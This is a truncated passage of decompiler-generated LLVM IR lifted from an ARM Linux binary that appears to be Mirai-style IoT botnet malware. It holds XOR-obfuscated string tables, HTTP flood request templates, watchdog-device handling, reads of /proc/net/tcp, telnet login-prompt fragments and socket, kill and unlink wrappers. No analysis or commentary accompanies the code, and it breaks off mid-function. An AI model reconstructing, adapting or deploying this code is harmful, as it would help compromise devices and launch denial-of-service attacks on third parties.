source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_fd_set = type { [1 x i32] }
%timeval = type { i32, i32 }
%dirent = type { i32, i32, i16, i8, [256 x i8] }
%__dirstream = type { i32 }
%_TYPEDEF_sigset_t = type { [1 x i32] }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_1cb1c.2 = global i32 1
@global_var_1cbb4.3 = global i32* @global_var_1cb1c.2
@global_var_1cbbc.4 = global i32 0
@global_var_1cbd4.10 = global i32 35716
@global_var_1cbd8.11 = global i32 35716
@global_var_1cbdc.12 = global i32 35716
@global_var_1cbe0.13 = global i32 35716
@global_var_1cbe4.14 = global i32 35716
@global_var_1cbe8.15 = global i32 35716
@global_var_1cbec.16 = global i32 35716
@global_var_1cbf0.17 = global i32 35716
@global_var_1cbf4.18 = global i32 35716
@global_var_1cbf8.19 = global i32 35716
@global_var_1cbfc.20 = global i32 35716
@global_var_1cc00.21 = global i32 35716
@global_var_1cc08.23 = global i32 35716
@global_var_1cc0c.24 = global i32 35716
@global_var_1cc10.25 = global i32 35716
@global_var_1cc14.26 = global i32 35716
@global_var_1cc18.27 = global i32 35716
@global_var_1cc1c.28 = global i32 35716
@global_var_1cc20.29 = global i32 35716
@global_var_1cc24.30 = global i32 35716
@global_var_1cc28.31 = global i32 35716
@global_var_1cc2c.32 = global i32 35716
@global_var_1cc30.33 = global i32 35716
@global_var_1cc34.34 = global i32 35716
@global_var_1cc38.35 = global i32 35716
@global_var_1cc3c.36 = global i32 35716
@global_var_1cc40.37 = global i32 35716
@global_var_1cc44.38 = global i32 35716
@global_var_1cc48.39 = global i32 35716
@global_var_1cc4c.40 = global i32 35716
@global_var_1cc50.41 = global i32 35716
@global_var_1cc54.42 = global i32 35716
@global_var_1cc58.43 = global i32 35716
@global_var_1cc5c.44 = global i32 35716
@global_var_1cc64.46 = global i32 35716
@global_var_1cc68.47 = global i32 35716
@global_var_1cc6c.48 = global i32 35716
@global_var_1cc70.49 = global i32 35716
@global_var_1cc74.50 = global i32 35716
@global_var_1cc78.51 = global i32 35716
@global_var_1cc7c.52 = global i32 35716
@global_var_1cc80.53 = global i32 35716
@global_var_1cc84.54 = global i32 35716
@global_var_1cc88.55 = global i32 35716
@global_var_1cc8c.56 = global i32 35716
@global_var_1cb14.60 = global i32 0
@global_var_1cc98.61 = global i32* @global_var_1cb14.60
@global_var_1ccb8.67 = global i32 0
@global_var_10168.73 = constant i32 -382906384
@global_var_142fc.76 = constant [4 x i8] c"GET\00"
@global_var_8dcc.80 = constant i32 -493894144
@global_var_142f4.82 = constant i32 32
@global_var_142cc.84 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_142e4.86 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_142f0.88 = constant [3 x i8] c"\0D\0A\00"
@global_var_14304.90 = constant [9 x i8] c"Cookie: \00"
@global_var_14310.92 = constant [3 x i8] c"; \00"
@global_var_14314.94 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_1431c.96 = constant i32 59
@global_var_14320.98 = constant [5 x i8] c"http\00"
@global_var_14328.100 = constant [5 x i8] c"url=\00"
@global_var_14330.102 = constant [5 x i8] c"POST\00"
@global_var_139c4.103 = constant i32 -439275520
@global_var_14338.105 = constant i32 39
@global_var_1433c.107 = constant i32 61
@global_var_1ccd4.111 = global i32 0
@global_var_ae24.112 = constant i32 -352321546
@global_var_8de4.113 = constant i32 -493894144
@global_var_1ccd8.115 = global i32 0
@global_var_1ccdc.116 = local_unnamed_addr global i32 0
@global_var_e508.122 = constant i32 -382906384
@global_var_e9cc.124 = constant i32 -382906384
@global_var_db98.126 = constant i32 -382906384
@global_var_d454.128 = constant i32 -382906384
@global_var_cce0.130 = constant i32 -382906384
@global_var_c480.132 = constant i32 -382906384
@global_var_bd64.134 = constant i32 -382906384
@global_var_b5e8.136 = constant i32 -382906384
@global_var_8f24.138 = constant i32 -382906384
@global_var_1cd48.140 = global i32 0
@global_var_1cd50.151 = global i32 0
@global_var_14340.153 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_1ccf8.157 = global i32 0
@global_var_100d8.161 = constant i32 -382910352
@global_var_1cca8.163 = global i32 80980
@global_var_1cca0.165 = global i32 -1
@global_var_1cd58.171 = local_unnamed_addr global i32 0
@global_var_1cd57.172 = local_unnamed_addr global i32 0
@global_var_1cd56.173 = local_unnamed_addr global i32 0
@global_var_14350.177 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_1cd55.182 = local_unnamed_addr global i32 0
@global_var_143a4.184 = constant [3 x i8] c"/.\00"
@global_var_14380.186 = constant i32 65384
@global_var_ff68.187 = constant i32 -382909968
@global_var_13074.189 = constant i32 -509607552
@global_var_1312c.192 = constant i32 -382906384
@global_var_12fbc.194 = constant i32 -509607552
@global_var_143a0.199 = constant i32 65360
@global_var_14374.201 = constant i32 10
@global_var_14360.203 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_1cca4.205 = global i32 -1
@global_var_13c54.210 = constant i32 -382910224
@global_var_14378.212 = constant i32 16777216
@global_var_1cd00.214 = global i32 0
@global_var_1cd0c.216 = global i32 0
@global_var_1cd04.218 = global i32 0
@global_var_1cd08.220 = global i32 0
@global_var_143b8.226 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_112a4.235 = constant i32 -442695668
@global_var_1cd6c.237 = global i32 0
@global_var_1cd44.239 = global i32 0
@global_var_1cd10.241 = global i32 0
@global_var_1cd3c.243 = global i32 0
@global_var_1cd64.251 = global i32 0
@global_var_1cd68.253 = global i32 0
@global_var_1cd14.255 = global i32 0
@global_var_1cd17.256 = local_unnamed_addr global i32 0
@global_var_1cd16.257 = local_unnamed_addr global i32 0
@global_var_1cd28.259 = global i32 0
@global_var_1cd1c.261 = local_unnamed_addr global i32 0
@global_var_1cd19.262 = local_unnamed_addr global i32 0
@global_var_1cd29.263 = local_unnamed_addr global i32 0
@global_var_1cd2b.264 = local_unnamed_addr global i32 0
@global_var_1cd1d.265 = local_unnamed_addr global i32 0
@global_var_1cd18.266 = local_unnamed_addr global i32 0
@global_var_1cd2a.267 = local_unnamed_addr global i32 0
@global_var_1cd37.269 = local_unnamed_addr global i32 0
@global_var_1cd36.270 = local_unnamed_addr global i32 0
@global_var_14544.272 = constant [5 x i8] c"PMMV\00"
@global_var_1454c.274 = constant i32 387006810
@global_var_14554.276 = constant [6 x i8] c"TKXZT\00"
@global_var_1455c.278 = constant [6 x i8] c"CFOKL\00"
@global_var_14564.280 = constant i32 437918234
@global_var_1456c.282 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_14574.284 = constant [8 x i8] c"FGDCWNV\00"
@global_var_1457c.286 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_14588.288 = constant i32 370216979
@global_var_14590.290 = constant i32 269555223
@global_var_14598.292 = constant [8 x i8] c"QWRRMPV\00"
@global_var_14318.294 = constant i32 0
@global_var_143dc.296 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_143e8.298 = constant i32 370216979
@global_var_143f0.300 = constant [5 x i8] c"WQGP\00"
@global_var_143f8.302 = constant [5 x i8] c"RCQQ\00"
@global_var_14400.304 = constant i32 1263486531
@global_var_1440c.306 = constant i32 320017171
@global_var_14414.308 = constant [9 x i8] c"QOACFOKL\00"
@global_var_14420.310 = constant i32 336860180
@global_var_14428.312 = constant i32 370216979
@global_var_14430.314 = constant i32 324292169
@global_var_14438.316 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_14448.318 = constant [7 x i8] c"OGKLQO\00"
@global_var_14450.320 = constant [8 x i8] c"QGPTKAG\00"
@global_var_14458.322 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_14464.324 = constant [6 x i8] c"EWGQV\00"
@global_var_1446c.326 = constant i32 1263486531
@global_var_14474.328 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_14484.330 = constant [5 x i8] c"W@LV\00"
@global_var_1448c.332 = constant i32 324292169
@global_var_14494.334 = constant i32 390551160
@global_var_1449c.336 = constant i32 387009354
@global_var_144a4.338 = constant [6 x i8] c"HT@XF\00"
@global_var_144ac.340 = constant [5 x i8] c"CLIM\00"
@global_var_144b4.342 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_144bc.344 = constant i32 1867011861
@global_var_144cc.346 = constant i32 1867011861
@global_var_144dc.348 = constant [7 x i8] c"Q[QVGO\00"
@global_var_144e4.350 = constant [5 x i8] c"KIU@\00"
@global_var_144ec.352 = constant [9 x i8] c"FPGCO@MZ\00"
@global_var_144f8.354 = constant [8 x i8] c"PGCNVGI\00"
@global_var_14500.356 = constant i32 303174162
@global_var_1450c.358 = constant i32 320017171
@global_var_14514.360 = constant i32 319820054
@global_var_14580.362 = constant [5 x i8] c"VGAJ\00"
@global_var_1451c.364 = constant [7 x i8] c"OMVJGP\00"
@global_var_14524.366 = constant [7 x i8] c"DWAIGP\00"
@global_var_1cd20.367 = local_unnamed_addr global i32 0
@global_var_1cd1e.369 = local_unnamed_addr global i32 0
@global_var_1cd1f.370 = local_unnamed_addr global i32 0
@global_var_1cd38.372 = local_unnamed_addr global i32 0
@global_var_1cd39.373 = local_unnamed_addr global i32 0
@global_var_1452c.378 = constant [5 x i8] c"ogin\00"
@global_var_14534.380 = constant [6 x i8] c"enter\00"
@global_var_145a9.384 = constant i32 1075837951
@global_var_145a0.386 = constant i32 2095871
@global_var_1453c.388 = constant [8 x i8] c"assword\00"
@global_var_1cd74.390 = global i32 0
@global_var_1ccb0.393 = global i32 -559038737
@global_var_145ac.398 = constant [10 x i8] c"@MCVX\0CVI\22\00"
@global_var_1cd90.399 = local_unnamed_addr global i32 0
@global_var_1cd8c.400 = local_unnamed_addr global i32 0
@global_var_1cd91.401 = local_unnamed_addr global i32 0
@global_var_145b8.403 = constant [3 x i8] c"\225\00"
@global_var_1cd94.404 = local_unnamed_addr global i32 0
@global_var_1cd98.405 = local_unnamed_addr global i32 0
@global_var_1cd99.406 = local_unnamed_addr global i32 0
@global_var_145bc.408 = constant [15 x i8] c"VGNLGVECLE\0CVI\22\00"
@global_var_1ce08.409 = local_unnamed_addr global i32 0
@global_var_1ce04.410 = local_unnamed_addr global i32 0
@global_var_1ce09.411 = local_unnamed_addr global i32 0
@global_var_145cc.413 = constant i32 51097
@global_var_1ce0c.414 = local_unnamed_addr global i32 0
@global_var_1ce10.415 = local_unnamed_addr global i32 0
@global_var_1ce11.416 = local_unnamed_addr global i32 0
@global_var_145d0.418 = constant i32 1448168270
@global_var_1cd88.419 = local_unnamed_addr global i32 0
@global_var_1cd84.420 = local_unnamed_addr global i32 0
@global_var_1cd89.421 = local_unnamed_addr global i32 0
@global_var_145e0.423 = constant i32 1381389898
@global_var_1cda0.424 = local_unnamed_addr global i32 0
@global_var_1cd9c.425 = local_unnamed_addr global i32 0
@global_var_1cda1.426 = local_unnamed_addr global i32 0
@global_var_14600.428 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_1cda4.429 = local_unnamed_addr global i32 0
@global_var_1cda8.430 = local_unnamed_addr global i32 0
@global_var_1cda9.431 = local_unnamed_addr global i32 0
@global_var_14608.433 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_1cdb0.434 = local_unnamed_addr global i32 0
@global_var_1cdac.435 = local_unnamed_addr global i32 0
@global_var_1cdb1.436 = local_unnamed_addr global i32 0
@global_var_14610.438 = constant i32 1195772418
@global_var_1cdb4.439 = local_unnamed_addr global i32 0
@global_var_1cdb8.440 = local_unnamed_addr global i32 0
@global_var_1cdb9.441 = local_unnamed_addr global i32 0
@global_var_1461c.443 = constant [5 x i8] c"\0DDF\22\00"
@global_var_1cdc0.444 = local_unnamed_addr global i32 0
@global_var_1cdbc.445 = local_unnamed_addr global i32 0
@global_var_1cdc1.446 = local_unnamed_addr global i32 0
@global_var_14624.448 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_1cdc4.449 = local_unnamed_addr global i32 0
@global_var_1cdc8.450 = local_unnamed_addr global i32 0
@global_var_1cdc9.451 = local_unnamed_addr global i32 0
@global_var_1462c.453 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_1cdd0.454 = local_unnamed_addr global i32 0
@global_var_1cdcc.455 = local_unnamed_addr global i32 0
@global_var_1cdd1.456 = local_unnamed_addr global i32 0
@global_var_14638.458 = constant i32 1836214128
@global_var_1cdd8.459 = local_unnamed_addr global i32 0
@global_var_1cdd4.460 = local_unnamed_addr global i32 0
@global_var_1cdd9.461 = local_unnamed_addr global i32 0
@global_var_14648.463 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_1cddc.464 = local_unnamed_addr global i32 0
@global_var_1cde0.465 = local_unnamed_addr global i32 0
@global_var_1cde1.466 = local_unnamed_addr global i32 0
@global_var_14654.468 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_1cde4.469 = local_unnamed_addr global i32 0
@global_var_1cde8.470 = local_unnamed_addr global i32 0
@global_var_1cde9.471 = local_unnamed_addr global i32 0
@global_var_14660.473 = constant i32 437738110
@global_var_1cdf0.474 = local_unnamed_addr global i32 0
@global_var_1cdec.475 = local_unnamed_addr global i32 0
@global_var_1cdf1.476 = local_unnamed_addr global i32 0
@global_var_14684.478 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_1cdf8.479 = local_unnamed_addr global i32 0
@global_var_1cdf4.480 = local_unnamed_addr global i32 0
@global_var_1cdf9.481 = local_unnamed_addr global i32 0
@global_var_14690.483 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_1cdfc.484 = local_unnamed_addr global i32 0
@global_var_1ce00.485 = local_unnamed_addr global i32 0
@global_var_1ce01.486 = local_unnamed_addr global i32 0
@global_var_1469c.488 = constant [7 x i8] c"QJGNN\22\00"
@global_var_1ce18.489 = local_unnamed_addr global i32 0
@global_var_1ce14.490 = local_unnamed_addr global i32 0
@global_var_1ce19.491 = local_unnamed_addr global i32 0
@global_var_146a4.493 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_1ce1c.494 = local_unnamed_addr global i32 0
@global_var_1ce20.495 = local_unnamed_addr global i32 0
@global_var_1ce21.496 = local_unnamed_addr global i32 0
@global_var_146ac.498 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_1ce24.499 = local_unnamed_addr global i32 0
@global_var_1ce28.500 = local_unnamed_addr global i32 0
@global_var_1ce29.501 = local_unnamed_addr global i32 0
@global_var_146b4.503 = constant [4 x i8] c"QJ\22\00"
@global_var_1ce30.504 = local_unnamed_addr global i32 0
@global_var_1ce2c.505 = local_unnamed_addr global i32 0
@global_var_1ce31.506 = local_unnamed_addr global i32 0
@global_var_146b8.508 = constant i32 1280000013
@global_var_1ce34.509 = local_unnamed_addr global i32 0
@global_var_1ce38.510 = local_unnamed_addr global i32 0
@global_var_1ce39.511 = local_unnamed_addr global i32 0
@global_var_146cc.513 = constant i32 1668311919
@global_var_1ce40.514 = local_unnamed_addr global i32 0
@global_var_1ce3c.515 = local_unnamed_addr global i32 0
@global_var_1ce41.516 = local_unnamed_addr global i32 0
@global_var_146e8.518 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_1ce48.519 = local_unnamed_addr global i32 0
@global_var_1ce44.520 = local_unnamed_addr global i32 0
@global_var_1ce49.521 = local_unnamed_addr global i32 0
@global_var_146f4.523 = constant i32 1280000013
@global_var_1ce4c.524 = local_unnamed_addr global i32 0
@global_var_1ce50.525 = local_unnamed_addr global i32 0
@global_var_1ce51.526 = local_unnamed_addr global i32 0
@global_var_14708.528 = constant i32 1280000013
@global_var_1ce58.529 = local_unnamed_addr global i32 0
@global_var_1ce54.530 = local_unnamed_addr global i32 0
@global_var_1ce59.531 = local_unnamed_addr global i32 0
@global_var_14720.533 = constant i32 1464693110
@global_var_1ce60.534 = local_unnamed_addr global i32 0
@global_var_1ce5c.535 = local_unnamed_addr global i32 0
@global_var_1ce61.536 = local_unnamed_addr global i32 0
@global_var_14738.538 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_1ce68.539 = local_unnamed_addr global i32 0
@global_var_1ce64.540 = local_unnamed_addr global i32 0
@global_var_1ce69.541 = local_unnamed_addr global i32 0
@global_var_1474c.543 = constant i32 1196376908
@global_var_1ce6c.544 = local_unnamed_addr global i32 0
@global_var_1ce70.545 = local_unnamed_addr global i32 0
@global_var_1ce71.546 = local_unnamed_addr global i32 0
@global_var_1475c.548 = constant i32 1280068961
@global_var_1ce78.549 = local_unnamed_addr global i32 0
@global_var_1ce74.550 = local_unnamed_addr global i32 0
@global_var_1ce79.551 = local_unnamed_addr global i32 0
@global_var_14774.553 = constant i32 1195458915
@global_var_1ce80.554 = local_unnamed_addr global i32 0
@global_var_1ce7c.555 = local_unnamed_addr global i32 0
@global_var_1ce81.556 = local_unnamed_addr global i32 0
@global_var_147c8.558 = constant i32 1195458915
@global_var_1ce88.559 = local_unnamed_addr global i32 0
@global_var_1ce84.560 = local_unnamed_addr global i32 0
@global_var_1ce89.561 = local_unnamed_addr global i32 0
@global_var_147ec.563 = constant i32 1447841121
@global_var_1ce90.564 = local_unnamed_addr global i32 0
@global_var_1ce8c.565 = local_unnamed_addr global i32 0
@global_var_1ce91.566 = local_unnamed_addr global i32 0
@global_var_14820.568 = constant i32 1633044305
@global_var_1ce94.569 = local_unnamed_addr global i32 0
@global_var_1ce98.570 = local_unnamed_addr global i32 0
@global_var_1ce99.571 = local_unnamed_addr global i32 0
@global_var_14830.573 = constant i32 1346651984
@global_var_1cea0.574 = local_unnamed_addr global i32 0
@global_var_1ce9c.575 = local_unnamed_addr global i32 0
@global_var_1cea1.576 = local_unnamed_addr global i32 0
@global_var_1483c.578 = constant i32 1128353102
@global_var_1cea4.579 = local_unnamed_addr global i32 0
@global_var_1cea8.580 = local_unnamed_addr global i32 0
@global_var_1cea9.581 = local_unnamed_addr global i32 0
@global_var_14848.583 = constant i32 257312593
@global_var_1ceac.584 = local_unnamed_addr global i32 0
@global_var_1ceb0.585 = local_unnamed_addr global i32 0
@global_var_1ceb1.586 = local_unnamed_addr global i32 0
@global_var_14858.588 = constant i32 1447841089
@global_var_1ceb4.589 = local_unnamed_addr global i32 0
@global_var_1ceb8.590 = local_unnamed_addr global i32 0
@global_var_1ceb9.591 = local_unnamed_addr global i32 0
@global_var_1486c.593 = constant i32 1279479894
@global_var_1cebc.594 = local_unnamed_addr global i32 0
@global_var_1cec0.595 = local_unnamed_addr global i32 0
@global_var_1cec1.596 = local_unnamed_addr global i32 0
@global_var_14880.598 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_1cec8.599 = local_unnamed_addr global i32 0
@global_var_1cec4.600 = local_unnamed_addr global i32 0
@global_var_1cec9.601 = local_unnamed_addr global i32 0
@global_var_14768.603 = constant i32 1380403017
@global_var_1cecc.604 = local_unnamed_addr global i32 0
@global_var_1ced0.605 = local_unnamed_addr global i32 0
@global_var_1ced1.606 = local_unnamed_addr global i32 0
@global_var_1488c.608 = constant i32 1280068929
@global_var_1ced4.609 = local_unnamed_addr global i32 0
@global_var_1ced8.610 = local_unnamed_addr global i32 0
@global_var_1ced9.611 = local_unnamed_addr global i32 0
@global_var_1489c.613 = constant i32 1414547281
@global_var_1cee0.614 = local_unnamed_addr global i32 0
@global_var_1cedc.615 = local_unnamed_addr global i32 0
@global_var_1cee1.616 = local_unnamed_addr global i32 0
@global_var_148b0.618 = constant i32 1414547281
@global_var_1cee8.619 = local_unnamed_addr global i32 0
@global_var_1cee4.620 = local_unnamed_addr global i32 0
@global_var_1cee9.621 = local_unnamed_addr global i32 0
@global_var_148cc.623 = constant i32 1264078191
@global_var_1ceec.624 = local_unnamed_addr global i32 0
@global_var_1cef0.625 = local_unnamed_addr global i32 0
@global_var_1cef1.626 = local_unnamed_addr global i32 0
@global_var_1493c.628 = constant i32 1264078191
@global_var_1cef4.629 = local_unnamed_addr global i32 0
@global_var_1cef8.630 = local_unnamed_addr global i32 0
@global_var_1cef9.631 = local_unnamed_addr global i32 0
@global_var_149ac.633 = constant i32 1264078191
@global_var_1cefc.634 = local_unnamed_addr global i32 0
@global_var_1cf00.635 = local_unnamed_addr global i32 0
@global_var_1cf01.636 = local_unnamed_addr global i32 0
@global_var_14a1c.638 = constant i32 1264078191
@global_var_1cf08.639 = local_unnamed_addr global i32 0
@global_var_1cf04.640 = local_unnamed_addr global i32 0
@global_var_1cf09.641 = local_unnamed_addr global i32 0
@global_var_14a8c.643 = constant i32 1264078191
@global_var_1cf0c.644 = local_unnamed_addr global i32 0
@global_var_1cf10.645 = local_unnamed_addr global i32 0
@global_var_1cb0c.647 = global i32 0
@global_var_1cb08.648 = global i32 -1
@global_var_1ccb4.58 = external global i8*
@1 = internal constant [2 x i8] c"/\00"
@2 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_1ccd0.109 = external global i8*
@global_var_1ccd1.120 = global i8 0
@global_var_1cd4c.159 = external global i8*
@3 = internal constant [2 x i8] c"\01\00"
@global_var_1ccac.167 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_1cd54.170 = external global i8*
@global_var_ff50.175 = constant void (i32)* inttoptr (i32 -442556408 to void (i32)*)
@global_var_1ccfc.208 = external global i8*
@global_var_1cd40.245 = external global i8*
@global_var_1cd41.246 = local_unnamed_addr global i8 0
@global_var_1cd34.260 = local_unnamed_addr global i8 0
@global_var_1cd35.268 = local_unnamed_addr global i8 0
@global_var_1cd2c.371 = local_unnamed_addr global i8 0
@global_var_1cd24.368 = local_unnamed_addr global i8 0
@global_var_14300.78 = constant [2 x i8] c"/\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8b6c() local_unnamed_addr {
entry:
  %v3_8b70 = load i32, i32* @r4, align 4
  %v0_8b78 = call i32 @function_8e88()
  store i32 %v0_8b78, i32* @r0, align 4
  %v1_8b7c = call i32 @function_1426c(i32 %v0_8b78)
  call void @__pseudo_branch(i32 %v3_8b70)
  ret i32 %v1_8b7c
}

define i32 @function_8b84(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8b90 = load i32, i32* @global_var_1cbbc.4, align 4
  call void @__pseudo_branch(i32 %v3_8b90)
  %v0_8b94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8b94, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_ioctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v4_8ba0 = call i32 @getpid()
  ret i32 %v4_8ba0
}

define i32 @_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8bac = call i32 @unknown_e28cca13()
  ret i32 %v4_8bac
}

define i32 @_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8bb8 = call i32 @unknown_e5bcfff8()
  ret i32 %v4_8bb8
}

define i32 @_sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8bc4 = load i32, i32* @r0, align 4
  %v5_8bc4 = load i32, i32* @r1, align 4
  %v9_8bc4 = call i32 @prctl(i32 %v4_8bc4, i32 %v5_8bc4, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v9_8bc4
}

define i32 @_memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_8bd0 = call i32 @unknown_e28cca13()
  ret i32 %v3_8bd0

; uselistorder directives
  uselistorder i32 ()* @unknown_e28cca13, { 1, 0 }
}

define i32 @_getpid() local_unnamed_addr {
entry:
  %v4_8bdc = call i32 @getpid()
  ret i32 %v4_8bdc
}

define i32 @_prctl(i32 %option, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v9_8be8 = call i32 @prctl(i32 %option, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  ret i32 %v9_8be8
}

define i32* @_memcpy(i32* %dest, i32* %src, i32 %n) local_unnamed_addr {
entry:
  %v9_8bf4 = call i32* @memcpy(i32* %dest, i32* %src, i32 %n)
  ret i32* %v9_8bf4
}

define i32 @_readlink(i8* %path, i8* %buf, i32 %len) local_unnamed_addr {
entry:
  %v9_8c00 = call i32 @readlink(i8* %path, i8* %buf, i32 %len)
  ret i32 %v9_8c00
}

define i32* @_malloc(i32 %size) local_unnamed_addr {
entry:
  %v5_8c0c = call i32* @malloc(i32 %size)
  ret i32* %v5_8c0c
}

define i32 @_sleep(i32 %seconds) local_unnamed_addr {
entry:
  %v5_8c18 = call i32 @sleep(i32 %seconds)
  ret i32 %v5_8c18
}

define i32 @_recvfrom(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32* %addr_len) local_unnamed_addr {
entry:
  %v10_8c24 = call i32 @recvfrom(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32* %addr_len)
  ret i32 %v10_8c24
}

define i32 @_socket(i32 %domain, i32 %type, i32 %protocol) local_unnamed_addr {
entry:
  %v7_8c30 = call i32 @socket(i32 %domain, i32 %type, i32 %protocol)
  ret i32 %v7_8c30
}

define i32 @_select(i32 %nfds, %_TYPEDEF_fd_set* %readfds, %_TYPEDEF_fd_set* %writefds, %_TYPEDEF_fd_set* %exceptfds, %timeval* %timeout) local_unnamed_addr {
entry:
  %v12_8c3c = call i32 @select(i32 %nfds, %_TYPEDEF_fd_set* %readfds, %_TYPEDEF_fd_set* %writefds, %_TYPEDEF_fd_set* %exceptfds, %timeval* %timeout)
  ret i32 %v12_8c3c
}

define %dirent* @_readdir(%__dirstream* %dirp) local_unnamed_addr {
entry:
  %v6_8c48 = call %dirent* @readdir(%__dirstream* %dirp)
  ret %dirent* %v6_8c48
}

define i32 @_sigaddset(%_TYPEDEF_sigset_t* %set, i32 %signo) local_unnamed_addr {
entry:
  %v7_8c54 = call i32 @sigaddset(%_TYPEDEF_sigset_t* %set, i32 %signo)
  ret i32 %v7_8c54
}

define i32 @_send(i32 %fd, i32* %buf, i32 %n, i32 %flags) local_unnamed_addr {
entry:
  %v9_8c60 = call i32 @send(i32 %fd, i32* %buf, i32 %n, i32 %flags)
  ret i32 %v9_8c60
}

; Function Attrs: noreturn
define void @_abort() local_unnamed_addr #0 {
entry:
  call void @abort()
  unreachable
}

define i32 @_accept(i32 %fd, %sockaddr* %addr, i32* %addr_len) local_unnamed_addr {
entry:
  %v9_8c78 = call i32 @accept(i32 %fd, %sockaddr* %addr, i32* %addr_len)
  ret i32 %v9_8c78
}

define i32* @_calloc(i32 %nmemb, i32 %size) local_unnamed_addr {
entry:
  %v6_8c84 = call i32* @calloc(i32 %nmemb, i32 %size)
  ret i32* %v6_8c84
}

define i32 @_write(i32 %fd, i32* %buf, i32 %n) local_unnamed_addr {
entry:
  %v8_8c90 = call i32 @write(i32 %fd, i32* %buf, i32 %n)
  ret i32 %v8_8c90
}

define i32 @_kill(i32 %pid, i32 %sig) local_unnamed_addr {
entry:
  %v6_8c9c = call i32 @kill(i32 %pid, i32 %sig)
  ret i32 %v6_8c9c
}

define i32 @_bind(i32 %fd, %sockaddr* %addr, i32 %len) local_unnamed_addr {
entry:
  %v8_8ca8 = call i32 @bind(i32 %fd, %sockaddr* %addr, i32 %len)
  ret i32 %v8_8ca8
}

define i32 @_inet_addr(i8* %cp) local_unnamed_addr {
entry:
  %v6_8cb4 = call i32 @inet_addr(i8* %cp)
  ret i32 %v6_8cb4
}

define i32 @_chdir(i8* %path) local_unnamed_addr {
entry:
  %v6_8cc0 = call i32 @chdir(i8* %path)
  ret i32 %v6_8cc0
}

define i32 @_setsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32 %optlen) local_unnamed_addr {
entry:
  %v10_8ccc = call i32 @setsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32 %optlen)
  ret i32 %v10_8ccc
}

define void (i32)* @_signal(i32 %sig, void (i32)* %handler) local_unnamed_addr {
entry:
  %v7_8cd8 = call void (i32)* @signal(i32 %sig, void (i32)* %handler)
  ret void (i32)* %v7_8cd8
}

define i32 @_read(i32 %fd, i32* %buf, i32 %nbytes) local_unnamed_addr {
entry:
  %v8_8ce4 = call i32 @read(i32 %fd, i32* %buf, i32 %nbytes)
  ret i32 %v8_8ce4
}

define i32 @_unlink(i8* %name) local_unnamed_addr {
entry:
  %v6_8cf0 = call i32 @unlink(i8* %name)
  ret i32 %v6_8cf0
}

define i32 @_sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len) local_unnamed_addr {
entry:
  %v11_8cfc = call i32 @sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len)
  ret i32 %v11_8cfc
}

define i32* @_realloc(i32* %ptr, i32 %size) local_unnamed_addr {
entry:
